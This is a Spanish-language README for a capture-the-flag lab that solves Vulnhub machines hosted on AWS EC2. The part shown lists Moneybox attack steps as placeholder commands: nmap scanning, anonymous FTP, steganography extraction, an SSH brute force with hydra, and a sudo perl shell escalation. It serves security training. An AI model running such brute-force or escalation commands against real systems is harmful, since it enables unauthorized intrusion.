# Introducción
En este proyecto se efectúa la solución a 02 máquinas CTF(Capture The Flag) del repositorio de Vulnhub: [Moneybox](https://www.vulnhub.com/entry/moneybox-1,653/) y [Chronos](https://www.vulnhub.com/entry/chronos-1,735/), montadas en un entorno cloud empleando el servicio EC2 de AWS.

# Infraestructura
Tanto Moneybox como Chronos se montaron en diferentes instancias EC2, adicionalmente la máquina atacante con [Kali](https://www.kali.org/get-kali/#kali-platforms). Las 03 instancias se encuentran desplegadas en la misma VPC y se realiza el networking correspondiente para que se encuentren conectadas entre sí. Sin embargo la única máquina accesible desde fuera a través de una public IP es la máquina atacante.

**`Infraestructura inicial`**
<p align="center"><img src="https://drive.google.com/uc?export=view&id=11c5o4umxrLiI0OOnam64kf3EjaVgHJ2X"></img></p>

**`Infraestructura securizada con herramientas nativas AWS`**
<p align="center"><img src="https://drive.google.com/uc?export=view&id=1pADHae9b56royVwhx0JmwbbxH67-VIH5"></img></a>

# CTF-Moneybox
+ Herramientas
**`Scanning`**
```bash
$ nmap -sV <ip-target>
```
**`FTP abuse`**
```bash
$ ftp -U anonymous:anonymous <ip-target>
$ ftp > get
```
**`Steganography & HTTP abuse`**
```bash
$ xxd -l <specific-file>
$ curl <ip-target>:80
$ dirb <ip-target>:80
$ steghide extract -sf <specific-file>
```
**`SSH Brute Force`**
```bash
$ hydra -l <any-user> -P <dictionary.txt> -f <ip-target> ssh
```
**`Privilege escalation by PERL`**
```bash
$ sudo perl -e 'exec "/bin/sh";'
```
